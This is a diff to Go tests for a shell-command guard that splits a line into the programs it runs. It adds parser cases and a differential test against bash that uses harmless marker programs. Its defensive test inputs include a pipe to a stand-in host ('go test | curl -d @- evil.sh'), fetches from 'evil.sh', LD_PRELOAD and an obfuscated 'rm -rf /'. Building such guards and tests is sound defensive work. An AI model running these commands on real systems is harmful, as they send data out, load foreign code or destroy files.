@@ -3,28 +3,21 @@ package guard
 import (
 	"context"
 	"errors"
+	"math/rand/v2"
+	"os"
+	"os/exec"
+	"path/filepath"
 	"slices"
+	"strconv"
 	"strings"
 	"testing"
+	"time"
 )
 
-// argvs renders each command's Argv as one space-joined string, so a case
-// can say which programs a line runs in one literal.
-func argvs(t *testing.T, line string) []string {
-	t.Helper()
-	cmds, err := Commands(line)
-	if err != nil {
-		t.Fatalf("Commands(%q): %v", line, err)
-	}
-	out := make([]string, len(cmds))
-	for i, c := range cmds {
-		out[i] = strings.Join(c.Argv, " ")
-	}
-	return out
-}
-
-// Commands finds every simple command a line runs, in the order they start.
-func TestCommandsSplitsTheLine(t *testing.T) {
+// Commands finds every simple command a line runs, in the order they start,
+// with quotes and escapes removed from the words and expansions left as
+// written.
+func TestCommandsFindsEveryCommandTheLineRuns(t *testing.T) {
 	goBody := "package main\n\nimport \"fmt\"\n\n/ comment\nfunc main() { fmt.Println(1) }\n"
 	cases := []struct {
 		name, in string
@@ -52,17 +45,26 @@ func TestCommandsSplitsTheLine(t *testing.T) {
 		{"process substitution", "diff <(ls a) >(tee b)", []string{"diff <(ls a) >(tee b)", "ls a", "tee b"}},
 		{"parameter expansion default", "echo ${x:-$(git push)}", []string{"echo ${x:-$(git push)}", "git push"}},
 		{"process substitution in a default", "echo ${x:-a <(git push)}", []string{"echo ${x:-a <(git push)}", "git push"}},
+		{"quoting inside a default", "echo ${x:-'})'\"$(git push)\"`ls`\\}<y}", []string{"echo ${x:-'})'\"$(git push)\"`ls`\\}<y}", "git push", "ls"}},
+		{"single quotes in a double-quoted default", "echo \"${x:-'}\" $(git push)", []string{"echo ${x:-'} $(git push)", "git push"}},
+		{"nested default", "echo ${x:-${y:-$(git push)}}", []string{"echo ${x:-${y:-$(git push)}}", "git push"}},
 		{"arithmetic substitution", "echo $(( $(git push) + 1 ))", []string{"echo $(( $(git push) + 1 ))", "git push"}},
+		{"quoting inside arithmetic", "echo $(( (1+2) * \"$(git push)\" + `ls` + '1' + \\) ))", []string{"echo $(( (1+2) * \"$(git push)\" + `ls` + '1' + \\) ))", "git push", "ls"}},
 		{"arithmetic shift is not a heredoc", "echo $((1<<x))\ngit push\nx\n", []string{"echo $((1<<x))", "git push", "x"}},
 		{"arithmetic command", "((x=1<<a))\ngit push\na", []string{"git push", "a"}},
 		{"double paren that is a subshell", "((ls); (git push))", []string{"ls", "git push"}},
 		{"dollar double paren that is a substitution", "echo $((ls); (git push))", []string{"echo $((ls); (git push))", "ls", "git push"}},
 		{"single quotes are literal", "echo 'a; $(b)'", []string{"echo a; $(b)"}},
 		{"escapes", `l\s -l a\ b`, []string{"ls -l a b"}},
+		{"escapes in double quotes", `echo "\$x \"q\" \\ \n" "a\` + "\n" + `b"`, []string{`echo $x "q" \ \n ab`}},
+		{"a trailing backslash", `echo a\`, []string{`echo a\`}},
 		{"quotes join a word", `g"i"t push`, []string{"git push"}},
-		{"ansi-c quoting stays unexpanded", `$'\x72m' -rf /`, []string{`$'\x72m' -rf /`}},
-		{"variable program stays unexpanded", `$CMD x "$HOME"`, []string{"$CMD x $HOME"}},
+		{"ansi-c quoting stays unexpanded", `$'\x72m\'' -rf /`, []string{`$'\x72m\'' -rf /`}},
+		{"locale quoting stays unexpanded", `$"rm" x`, []string{`$"rm" x`}},
+		{"variable program stays unexpanded", `$CMD x "$HOME" $1 $@ $? $_y2`, []string{"$CMD x $HOME $1 $@ $? $_y2"}},
+		{"a lone dollar is literal", `echo $ "$" a$`, []string{"echo $ $ a$"}},
 		{"line continuation", "go \\\n  test", []string{"go test"}},
+		{"line continuation inside a word", "gi\\\nt push", []string{"git push"}},
 		{"comment", "ls # ; git push", []string{"ls"}},
 		{"hash inside a word", "echo a#b; ls", []string{"echo a#b", "ls"}},
 		{"comment in a substitution", "echo $(echo hi # )\ngit push\n)", []string{"echo $(echo hi # )\ngit push\n)", "echo hi", "git push"}},
@@ -86,6 +88,7 @@ func TestCommandsSplitsTheLine(t *testing.T) {
 		{"a substitution still skips the body", "cat <<EOF\nnow $(date)\nEOF\nls", []string{"cat", "date", "ls"}},
 		{"assignment alone", "d=$(go list .)", []string{"", "go list ."}},
 		{"keywords are words", "if true; then rm x; fi", []string{"if true", "then rm x", "fi"}},
+		{"a digit word before a redirection is its descriptor", "ls 2>x a2>y", []string{"ls a2"}},
 	}
 	for _, c := range cases {
 		if got := argvs(t, c.in); !slices.Equal(got, c.want) {
@@ -94,10 +97,8 @@ func TestCommandsSplitsTheLine(t *testing.T) {
 	}
 }
 
-// Assignments, redirections and the text of each command are reported apart
-// from its argv.
-func TestCommandsReportsAssignmentsAndRedirections(t *testing.T) {
-	cmds, err := Commands("FOO=bar BAZ=1 git status 2>&1 >out <<<'in x' && x-y=1 ./scripts/x=y.sh")
+func TestCommandsReportsAssignmentsRedirectionsAndText(t *testing.T) {
+	cmds, err := Commands("FOO=bar BAZ=1 git status 2>&1 >out <<<'in x' &>all 3<>rw && x-y=1 ./scripts/x=y.sh")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -108,18 +109,20 @@ func TestCommandsReportsAssignmentsAndRedirections(t *testing.T) {
 	if !slices.Equal(first.Assign, []string{"FOO", "BAZ"}) || !slices.Equal(first.Argv, []string{"git", "status"}) {
 		t.Errorf("first = %+v", first)
 	}
-	wantRedirects := []Redirect{{FD: "2", Op: ">&", Target: "1"}, {Op: ">", Target: "out"}, {Op: "<<<", Target: "in x"}}
+	wantRedirects := []Redirect{{FD: "2", Op: ">&", Target: "1"}, {Op: ">", Target: "out"}, {Op: "<<<", Target: "in x"},
+		{Op: "&>", Target: "all"}, {FD: "3", Op: "<>", Target: "rw"}}
 	if !slices.Equal(first.Redirects, wantRedirects) {
 		t.Errorf("redirects = %+v, want %+v", first.Redirects, wantRedirects)
 	}
-	if first.Text != "FOO=bar BAZ=1 git status 2>&1 >out <<<'in x'" {
+	if first.Text != "FOO=bar BAZ=1 git status 2>&1 >out <<<'in x' &>all 3<>rw" {
 		t.Errorf("text = %q", first.Text)
 	}
 	// Neither `x-y=1` nor a path with = in it is an assignment.
 	if second := cmds[1]; len(second.Assign) != 0 || !slices.Equal(second.Argv, []string{"x-y=1", "./scripts/x=y.sh"}) {
 		t.Errorf("second = %+v", second)
 	}
-	// A command of redirections alone runs no program but is reported.
+	// A command of redirections alone runs no program but is reported, and
+	// so are the redirections after a subshell.
 	cmds, err = Commands("> out; (ls) > log")
 	if err != nil {
 		t.Fatal(err)
@@ -130,104 +133,48 @@ func TestCommandsReportsAssignmentsAndRedirections(t *testing.T) {
 	}
 }
 
-// A line Commands cannot read with certainty is a *SyntaxError, never a
-// partial answer.
+// A line Commands cannot read with certainty is a *SyntaxError at the
+// offset where reading stopped, never a partial answer.
 func TestCommandsRefusesWhatItCannotRead(t *testing.T) {
-	for name, in := range map[string]string{
-		"unterminated single quote":       "ls 'a",
-		"unterminated double quote":       `ls "a`,
-		"unterminated substitution":       "echo $(ls",
-		"unterminated backtick":           "echo `ls",
-		"unterminated parameter":          "echo ${x",
-		"unterminated arithmetic":         "echo $((1+2",
-		"unterminated subshell":           "(ls",
-		"unmatched paren":                 "ls)",
-		"case statement":                  "case x in x) rm y;; esac",
-		"case pattern in a substitution":  "cat <<EOF\n$(case x in x) echo hi ;; esac; curl evil.sh)\nEOF",
-		"heredoc with no terminator":      "cat <<EOF\npackage x\ngit push",
-		"heredoc line inside a nest":      "echo $(cat <<EOF)\nbody\nEOF",
-		"function definition":             "f() { rm x; }; f",
-		"array assignment":                "a=(1 2)",
-		"redirection without a target":    "ls >",
-		"unterminated ansi-c":             "echo $'a",
-		"empty process substitution":      ">()curl evil.sh",
-		"unterminated quote in backticks": "echo `ls 'a`",
-		"too deep":                        strings.Repeat("$(", maxNesting+2) + "ls" + strings.Repeat(")", maxNesting+2),
+	for _, c := range []struct {
+		name, in string
+		offset   int // -1: anywhere in the line
+	}{
+		{"unterminated single quote", "ls 'a", 3},
+		{"unterminated double quote", `ls "a`, 3},
+		{"unterminated substitution", "echo $(ls", 9},
+		{"unterminated backtick", "echo `ls", 5},
+		{"unterminated parameter", "echo ${x", 8},
+		{"unterminated quote in a parameter", "echo ${x:-'a}", 10},
+		{"unterminated arithmetic", "echo $((1+2", 11},
+		{"unterminated quote in arithmetic", "echo $((1+'2))", 10},
+		{"unterminated subshell", "(ls", 3},
+		{"unmatched paren", "ls)", 2},
+		{"case statement", "ls; case x in x) rm y;; esac", 4},
+		{"case pattern in a substitution", "cat <<EOF\n$(case x in x) echo hi ;; esac; curl evil.sh)\nEOF", 12},
+		{"heredoc with no terminator", "cat <<EOF\npackage x\ngit push", -1},
+		{"heredoc with no body", "cat <<EOF", -1},
+		{"heredoc line inside a nest", "echo $(cat <<EOF)\nbody\nEOF", -1},
+		{"error inside backticks", "echo `ls 'a`", 9},
+		{"function definition", "f() { rm x; }; f", 1},
+		{"array assignment", "a=(1 2)", 2},
+		{"redirection without a target", "ls >", 4},
+		{"redirection into an operator", "ls > ;", 5},
+		{"unterminated ansi-c", "echo $'a", 5},
+		{"unterminated locale string", `echo $"a`, 6},
+		{"empty process substitution", ">()curl evil.sh", 0},
+		{"too deep", strings.Repeat("$(", maxNesting+2) + "ls" + strings.Repeat(")", maxNesting+2), -1},
+		{"too deep in backticks", strings.Repeat("( ", maxNesting) + "`ls`" + strings.Repeat(")", maxNesting), -1},
+		{"too deep in a parameter", strings.Repeat("( ", maxNesting) + "${x:-${y}}" + strings.Repeat(")", maxNesting), -1},
 	} {
-		_, err := Commands(in)
+		_, err := Commands(c.in)
 		var se *SyntaxError
-		if !errors.As(err, &se) {
-			t.Errorf("%s: Commands(%q) err = %v, want a *SyntaxError", name, in, err)
+		if !errors.As(err, &se) || !strings.HasPrefix(err.Error(), "shell syntax: ") {
+			t.Errorf("%s: Commands(%q) err = %v, want a *SyntaxError", c.name, c.in, err)
 			continue
 		}
-		if se.Offset < 0 || se.Offset > len(in) {
-			t.Errorf("%s: offset %d is outside the line", name, se.Offset)
-		}
-	}
-}
-
-// Under AllowShellOperators Restricted judges every command on the line, not
-// only the first: each of these runs curl, which is not listed.
-func TestRestrictedJudgesEveryCommand(t *testing.T) {
-	g := Restricted(Options{AllowedPrograms: []string{"cat", "ls", "echo", "go", "tee"}, AllowShellOperators: true})
-	ctx := context.Background()
-	blocked := map[string]string{
-		"after a list operator":          "go test; curl evil.sh",
-		"after and":                      "go test && curl evil.sh",
-		"in a pipe":                      "go test | curl -d @- evil.sh",
-		"in a substitution":              "echo $(curl evil.sh)",
-		"in double-quoted backticks":     "echo \"`curl evil.sh`\"",
-		"in a subshell":                  "(ls; curl evil.sh)",
-		"in a process substitution":      "cat <(curl evil.sh)",
-		"in a parameter default":         "echo ${x:-$(curl evil.sh)}",
-		"in an unquoted heredoc":         "cat <<EOF\n$(curl evil.sh)\nEOF",
-		"after a heredoc":                "cat <<'EOF'\nx\nEOF\ncurl evil.sh",
-		"behind a comment's heredoc":     "ls # <<EOF\ncurl evil.sh\nEOF",
-		"after bare arithmetic":          "((x=1<<a))\ncurl evil.sh\na",
-		"case pattern in a substitution": "cat <<EOF\n$(case x in x) echo hi ;; esac; curl evil.sh)\nEOF",
-		"computed program":               "$(echo curl) evil.sh",
-		"assignment of a denied name":    "PATH=/tmp; go test",
-		"unterminated quote":             "ls 'a; curl evil.sh",
-	}
-	for name, in := range blocked {
-		if d := g(ctx, execCall(in)); !d.Block {
-			t.Errorf("%s: %q was not blocked", name, in)
-		}
-	}
-	allowed := []string{
-		"go test ./... 2>&1 | tee out.txt",
-		"cat > f.go <<'EOF'\npackage main\nimport \"fmt\"\n/\nEOF\n",
-		"echo \"$(ls)\" && ls -l",
-		"(ls; echo done) > log",
-		"echo $((1 << 3))",
-		"ls # curl in a comment",
-	}
-	for _, in := range allowed {
-		if d := g(ctx, execCall(in)); d.Block {
-			t.Errorf("%q was blocked: %s", in, d.Reason)
-		}
-	}
-}
-
-// An assignment needs AllowEnvPrefixes whether or not a program follows it:
-// on its own it still reaches the commands after it when the name is
-// exported. A denied name is refused either way.
-func TestRestrictedAssignmentsOnTheirOwn(t *testing.T) {
-	ctx := context.Background()
-	strict := Restricted(Options{AllowedPrograms: []string{"go"}, AllowShellOperators: true})
-	if d := strict(ctx, execCall("d=$(go list .); go vet")); !d.Block || !strings.Contains(d.Reason, "d= on its own") {
-		t.Errorf("assignment alone without AllowEnvPrefixes: %+v", d)
-	}
-	loose := Restricted(Options{AllowedPrograms: []string{"go"}, AllowShellOperators: true, AllowEnvPrefixes: true})
-	if d := loose(ctx, execCall("d=$(go list .); go vet")); d.Block {
-		t.Errorf("assignment alone with AllowEnvPrefixes: %s", d.Reason)
-	}
-	if d := loose(ctx, execCall("LD_PRELOAD=/x.so; go vet")); !d.Block {
-		t.Error("a denied name on its own was admitted")
-	}
-	for _, in := range []string{"", "   ", "# nothing", "X=1"} {
-		if d := loose(ctx, execCall(in)); !d.Block {
-			t.Errorf("%q runs no program and was admitted", in)
+		if c.offset >= 0 && se.Offset != c.offset || se.Offset < 0 || se.Offset > len(c.in) {
+			t.Errorf("%s: offset %d, want %d (%s)", c.name, se.Offset, c.offset, se.Reason)
 		}
 	}
 }
@@ -247,11 +194,98 @@ func FuzzCommands(f *testing.F) {
 			return
 		}
 		var se *SyntaxError
-		if !errors.As(err, &se) {
-			t.Fatalf("Commands(%q) err = %T %v, want a *SyntaxError", line, err, err)
-		}
-		if se.Offset < 0 || se.Offset > len(line) {
-			t.Fatalf("Commands(%q) offset %d outside the line", line, se.Offset)
+		if !errors.As(err, &se) || se.Offset < 0 || se.Offset > len(line) {
+			t.Fatalf("Commands(%q) err = %T %v, want a *SyntaxError in the line", line, err, err)
 		}
 	})
+}
+
+// TestCommandsAgainstBash checks Commands against the shell it reads: random
+// lines built from shell fragments are run by bash with a PATH holding only
+// marker programs that log their own name, and every marker bash ran must be
+// the program of a command Commands reported. A line Commands refuses is not
+// run, and neither is one with a computed program or a keyword in program
+// position: a guard refuses those by name, whatever they run.
+//
+// It needs bash and takes a while, so it runs only with AGENTKIT_BASH_DIFF=1;
+// AGENTKIT_BASH_DIFF_LINES sets the number of lines (default 20000).
+func TestCommandsAgainstBash(t *testing.T) {
+	if os.Getenv("AGENTKIT_BASH_DIFF") != "1" {
+		t.Skip("set AGENTKIT_BASH_DIFF=1 to run Commands against bash")
+	}
+	bash, err := exec.LookPath("bash")
+	if err != nil {
+		t.Skip("no bash")
+	}
+	lines := 20000
+	if s := os.Getenv("AGENTKIT_BASH_DIFF_LINES"); s != "" {
+		if lines, err = strconv.Atoi(s); err != nil {
+			t.Fatal(err)
+		}
+	}
+	dir := t.TempDir()
+	bin := filepath.Join(dir, "bin")
+	if err := os.Mkdir(bin, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	for i := range 6 {
+		name := "m" + strconv.Itoa(i)
+		if err := os.WriteFile(filepath.Join(bin, name), []byte("#!/bin/sh\necho "+name+" >> \"$MARKER_LOG\"\n"), 0o755); err != nil {
+			t.Fatal(err)
+		}
+	}
+	frags := []string{
+		"m0 <<EOF\n$(m1)\nEOF\n", "m2 <<'X'\nm3\nX\n", "$(m4; m5)", "\"$(m1)\"", "`m2`", "m3 <(m4)", "${y:-$(m5)}",
+		"${z:-m1 <(m2) >(m3)}", "\"${z:-<(m4)}\"", " # m1\n", "((a<<b))\n",
+		"m0", "m1", "m2", "m3 a", "m4", "m5", " ", " ", ";", "|", "&&", "||", "&", "$(", ")", "(", "`", "\"", "'",
+		"<<EOF\n", "\nEOF\n", "<<'EOF'\n", "<<-EOF\n", "\tEOF\n", "${x:-", "}", "((", "))", "$((", "#", "\n", "<(", ">(",
+		"\\", "\\\n", "x=", "$x", "1<<2", "case", " in ", "esac", ";;", "2>&1", ">", "<", "{", "}", "!", "if ", "then ",
+		"fi", "$'", "eval ",
+	}
+	refusable := map[string]bool{}
+	for _, k := range strings.Fields("if then else elif fi for while until do done ! { } [[ eval exec time coproc function select in esac case") {
+		refusable[k] = true
+	}
+	rng := rand.New(rand.NewPCG(1, uint64(time.Now().UnixNano())))
+	read, missed := 0, 0
+	for k := range lines {
+		var b strings.Builder
+		for range 2 + rng.IntN(10) {
+			b.WriteString(frags[rng.IntN(len(frags))])
+		}
+		line := b.String()
+		cmds, err := Commands(line)
+		if err != nil {
+			continue
+		}
+		read++
+		reported, skip := map[string]bool{}, false
+		for _, c := range cmds {
+			if len(c.Argv) > 0 {
+				reported[c.Argv[0]] = true
+				skip = skip || strings.ContainsAny(c.Argv[0], "$`") || refusable[c.Argv[0]]
+			}
+		}
+		if skip {
+			continue
+		}
+		// A log per line: bash does not wait for a background job, which may
+		// write after the next line starts.
+		log := filepath.Join(dir, "log"+strconv.Itoa(k))
+		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
+		cmd := exec.CommandContext(ctx, bash, "-c", line)
+		cmd.Env = []string{"PATH=" + bin, "MARKER_LOG=" + log}
+		cmd.Dir = dir
+		_ = cmd.Run()
+		cancel()
+		ran, _ := os.ReadFile(log)
+		for _, m := range strings.Fields(string(ran)) {
+			if !reported[m] {
+				if missed++; missed <= 10 {
+					t.Errorf("bash ran %s, which Commands did not report: %q -> %+v", m, line, cmds)
+				}
+			}
+		}
+	}
+	t.Logf("%d lines, %d read by Commands, %d programs missed", lines, read, missed)
 }
